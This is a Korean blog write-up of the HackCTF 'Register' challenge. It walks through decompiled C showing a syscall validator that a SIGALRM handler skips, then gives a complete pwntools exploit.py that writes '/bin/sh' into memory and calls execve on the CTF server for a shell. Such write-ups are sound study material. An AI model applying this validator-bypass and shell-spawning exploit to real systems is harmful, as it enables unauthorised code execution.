---
title: "[HackCTF]Register"
date: 2020-1-27
tags: [HackCTF]
categories: [HackCTF]
---

메인에서는 alarm함수로 5초후 시그널 보낸다.

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  alarm(5u);
  setvbuf(stdout, 0LL, 2, 0LL);
  build();
}
```

메인에서 실행되는 build함수는 siglarm가 발생하면 handler로 처리해준다. 

```c
void __noreturn build()
{
  __int64 v0; // [rsp+0h] [rbp-40h]
  __int64 v1; // [rsp+8h] [rbp-38h]
  __int64 v2; // [rsp+10h] [rbp-30h]
  __int64 v3; // [rsp+18h] [rbp-28h]
  __int64 v4; // [rsp+20h] [rbp-20h]
  __int64 v5; // [rsp+28h] [rbp-18h]
  __int64 v6; // [rsp+30h] [rbp-10h]
  unsigned __int64 v7; // [rsp+38h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  signal(14, handler);
  while ( 1 )
  {
    do
    {
      get_obj(&v0);
      obj = v0;
      qword_6010A8 = v1;
      qword_6010B0 = v2;
      qword_6010B8 = v3;
      qword_6010C0 = v4;
      qword_6010C8 = v5;
      qword_6010D0 = v6;
    }
    while ( validate_syscall_obj(v0) );
    raise(14);
  }
}
```

handler 내부를 보면 `exec_syscall_obj` 를 실행시켜주는데 우리가 입력한 값들이 각각 레지스터에 맞게 들어가 syscall을 호출해준다.

```c
__int64 __fastcall exec_syscall_obj(_QWORD *a1)
{
  _QWORD *v1; // rbx
  __int64 result; // rax
  __int64 v3; // rdi
  __int64 v4; // rsi
  __int64 v5; // rdx
  __int64 v6; // rcx
  __int64 v7; // r8
  __int64 v8; // r9

  v1 = a1;
  result = *a1;
  v3 = a1[1];
  v4 = v1[2];
  v5 = v1[3];
  v6 = v1[4];
  v7 = v1[5];
  v8 = v1[6];
  __asm { syscall; LINUX - }
  return result;
}
```

`validate_syscall_obj` 함수에서는 rax 레지스터 check를 해준다.

```c
__int64 __fastcall validate_syscall_obj(signed __int64 a1)
{
  unsigned int v2; // [rsp+14h] [rbp-4h]

  if ( a1 == 2 )
  {
    v2 = 0;
  }
  else if ( a1 > 2 )
  {
    if ( a1 == 3 )
    {
      v2 = 0;
    }
    else
    {
      if ( a1 != 60 )
        return 1;
      v2 = 0;
    }
  }
  else if ( a1 )
  {
    if ( a1 != 1 )
      return 1;
    v2 = 0;
  }
  else
  {
    v2 = 0;
  }
  return v2;
}
```

bss영역은 레지스터들이 사용되는 공간이라 data영역을 사용했다.

syscall 59는 필터링되어있어서 sleep() 줘서 sigalrm 떠서 handler 실행시키게 했다.

read(0,data,10) -> execve('/bin/sh\x00',0,0)

> exploit.py

```python
from pwn import *

# context.log_level = 'debug'
e = ELF('./register')
# p = process('./register')
p = remote('ctf.j0n9hyun.xyz',3026)
data = 0x0000000000601068

def chain(rax,rdi,rsi,rdx,rcx,r8,r9):
	p.sendlineafter(':',str(rax))
	p.sendlineafter(':',str(rdi))
	p.sendlineafter(':',str(rsi))
	p.sendlineafter(':',str(rdx))
	p.sendlineafter(':',str(rcx))
	p.sendlineafter(':',str(r8))
	p.sendlineafter(':',str(r9))

chain(0,0,data,10,0,0,0)
p.send('/bin/sh\x00')
chain(59,data,0,0,0,0,0)
sleep(5)
p.interactive()
```

